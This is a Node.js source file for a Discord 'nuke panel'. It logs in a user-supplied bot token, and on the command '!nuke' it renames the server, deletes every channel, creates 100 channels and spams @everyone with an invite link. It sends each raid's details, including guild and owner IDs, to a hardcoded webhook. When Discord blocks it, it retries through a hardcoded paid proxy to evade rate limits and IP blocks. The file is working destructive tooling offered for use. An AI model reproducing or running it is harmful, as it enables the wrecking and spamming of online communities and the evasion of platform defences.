import express from 'express';
import { Client, GatewayIntentBits, REST } from 'discord.js';
import { ProxyAgent } from 'undici';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';

const CONFIG = {
  channelName: 'anh-phtuankhanh-nuke',
  renameName: 'NUKE BY PHTUANKHANH',
  channelCount: 100,
  msgContent: '# > NUKE BY PHTUANKHANH\n\n@everyone\n\nhttps://discord.gg/BqZ7UdtwXG',
  msgCount: 1,
  pingEveryone: true
};

let client = null;
let currentClientId = null;
let currentToken = null;
let webLogs = [];

function pushLog(msg, type = 'info') {
  const log = { time: new Date().toLocaleTimeString(), msg, type };
  webLogs.push(log);
  if (webLogs.length > 200) webLogs.shift();
  console.log(`[${type.toUpperCase()}] ${msg}`);
}

const proxyStr = 'http://flme5a8d5ad-package-standard:d4bda2c8@proxy.flameproxies.com:8989';
const proxyDispatcher = new ProxyAgent(proxyStr);

async function notifyNuke(info) {
  const { guildName, guildIcon, guildId, ownerId, channels, msgs, user, error } = info;
  const fields = [
    { name: 'Server', value: guildName || 'không rõ', inline: true },
    { name: 'Guild ID', value: guildId || '-', inline: true },
    { name: 'Kênh tạo', value: String(channels ?? 0), inline: true },
    { name: 'Tin nhắn', value: String(msgs ?? 0), inline: true },
    { name: 'Người dùng', value: user || '-', inline: true },
    { name: 'Owner ID', value: ownerId || '-', inline: true },
    { name: 'Thời gian', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
  ];
  if (guildId) fields.push({ name: 'Link server', value: `https://discord.com/channels/${guildId}`, inline: false });
  if (error) fields.push({ name: 'Lỗi', value: String(error).slice(0, 1000), inline: false });

  const embed = {
    title: error ? 'Nuke thất bại' : 'Nuke thành công',
    color: error ? 0xff0000 : 0x00ff66,
    fields,
    thumbnail: guildIcon ? { url: guildIcon } : undefined,
    footer: { text: 'nuke panel | by PhTuanKhanh' },
    timestamp: new Date().toISOString(),
  };
  
  const body = { username: 'nuke notifier', avatar_url: guildIcon || null, embeds: [embed] };

  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      let res = await fetch(NOTIFY_WEBHOOK + '?wait=true', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });

      if ([429, 403, 404].includes(res.status)) {
        pushLog(`Webhook bị chặn IP (${res.status}). Chuyển qua Proxy...`, 'warn');
        res = await fetch(NOTIFY_WEBHOOK + '?wait=true', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
          dispatcher: proxyDispatcher
        });
      }

      if (res.status === 429) {
        await new Promise(r => setTimeout(r, 3000));
        continue;
      }
      if (!res.ok) {
        pushLog(`Webhook lỗi (${res.status})`, 'error');
        return;
      }
      pushLog(`Webhook gửi thành công!`, 'success');
      return;
    } catch (e) {
      pushLog(`Webhook crash: ${e.message}`, 'error');
      return;
    }
  }
}

// HÀM GỬI REQUEST CÓ FALLBACK SANG PROXY
async function safeRest(method, endpoint, data = {}) {
  if (!currentToken) throw new Error("Bot chưa login");
  
  const rest = new REST({ version: '10' }).setToken(currentToken);
  
  try {
    return await rest.request({ method, fullRoute: endpoint, body: data.data ? data : undefined, ...(!data.data && data ? { body: data } : {}) });
  } catch (err) {
    if ([429, 403, 404].includes(err.status)) {
      pushLog(`Discord chặn IP (${err.status}). Retry qua Proxy...`, 'warn');
      const proxyRest = new REST({ version: '10', agent: proxyDispatcher }).setToken(currentToken);
      return await proxyRest.request({ method, fullRoute: endpoint, body: data.data ? data : undefined, ...(!data.data && data ? { body: data } : {}) });
    }
    throw err;
  }
}

function startBot(token) {
  if (client) {
    client.destroy();
    client = null;
    currentClientId = null;
  }

  currentToken = token;

  client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMembers
    ]
  });

  client.on('ready', () => {
    currentClientId = client.user.id;
    pushLog(`BOT Đã online: ${client.user.tag}`, 'success');
  });

  client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.content !== '!nuke') return;

    const guild = message.guild;
    const t0 = Date.now();
    message.reply('🚀 Bắt đầu nuke...').catch(() => {});
    pushLog(`Bắt đầu nuke server: ${guild.name}`, 'warn');

    let channelsCreated = 0;
    let msgsSent = 0;

    try {
      const { channelCount: cc, channelName: chName, renameName: rName, msgCount: mc, msgContent: msgText, pingEveryone: ping } = CONFIG;

      // 1. RENAME
      if (rName) {
        pushLog(`Đang đổi tên server...`, 'info');
        await safeRest('PATCH', `/guilds/${guild.id}`, { name: rName }).catch(() => {});
      }

      // 2. NOTIFY WEBHOOK
      await notifyNuke({
        guildName: guild.name,
        guildIcon: guild.iconURL({ size: 256, extension: 'png' }),
        guildId: guild.id, ownerId: guild.ownerId,
        channels: cc, msgs: cc * mc,
        user: client.user.username,
        error: null,
      });

      // 3. XOÁ ALL KÊNH
      pushLog(`Đang xoá toàn bộ kênh...`, 'info');
      const oldChannels = await guild.channels.fetch().catch(() => null);
      if (oldChannels) {
        const delPromises = Array.from(oldChannels.values()).filter(Boolean).map(c => 
          safeRest('DELETE', `/channels/${c.id}`).catch(() => {})
        );
        await Promise.allSettled(delPromises);
      }

      // 4. TẠO KÊNH + SPAM
      pushLog(`Đang tạo ${cc} kênh và spam tin nhắn...`, 'info');
      const createPromises = Array.from({ length: cc }, () =>
        safeRest('POST', `/guilds/${guild.id}/channels`, { name: chName, type: 0 }).then(async c => {
          channelsCreated++;
          for (let i = 0; i < mc; i++) {
            await safeRest('POST', `/channels/${c.id}/messages`, {
              content: msgText,
              allowed_mentions: ping ? { parse: ['everyone'] } : { parse: [] }
            }).then(() => { msgsSent++; }).catch(() => {});
          }
        }).catch(() => null)
      );

      await Promise.allSettled(createPromises);

      pushLog(`NUKE HOÀN TẤT trong ${Date.now() - t0}ms!`, 'success');
      await new Promise(r => setTimeout(r, 2000));

    } catch (err) {
      pushLog(`Lỗi nuke: ${err.message}`, 'error');
    }
  });

  client.login(token).catch(e => {
    pushLog(`Lỗi đăng nhập: ${e.message}`, 'error');
    client = null;
    currentClientId = null;
    currentToken = null;
  });
}

app.post('/api/login', async (req, res) => {
  const { token } = req.body ?? {};
  if (!token || typeof token !== 'string') return res.status(400).json({ error: 'Thiếu token' });

  const cleanToken = token.trim();
  if (!/^[A-Za-z0-9._-]+$/.test(cleanToken)) return res.status(400).json({ error: 'Token không hợp lệ' });

  pushLog(`Đang kết nối bot...`, 'info');
  startBot(cleanToken);
  
  await new Promise(r => setTimeout(r, 2500));
  
  if (client && client.user) {
    res.json({ ok: true, user: client.user.tag, clientId: client.user.id });
  } else {
    res.status(500).json({ error: 'Đăng nhập thất bại. Kiểm tra lại token.' });
  }
});

app.post('/api/logout', (req, res) => {
  if (client) {
    client.destroy();
    client = null;
    currentClientId = null;
    currentToken = null;
    pushLog('Đã tắt kết nối hoàn toàn.', 'warn');
  }
  res.json({ ok: true });
});

app.get('/api/status', (req, res) => {
  res.json({
    online: !!(client && client.user),
    user: client?.user?.tag || null,
    clientId: currentClientId
  });
});

app.get('/api/logs', (req, res) => {
  res.json(webLogs);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`panel http://localhost:${PORT}`));
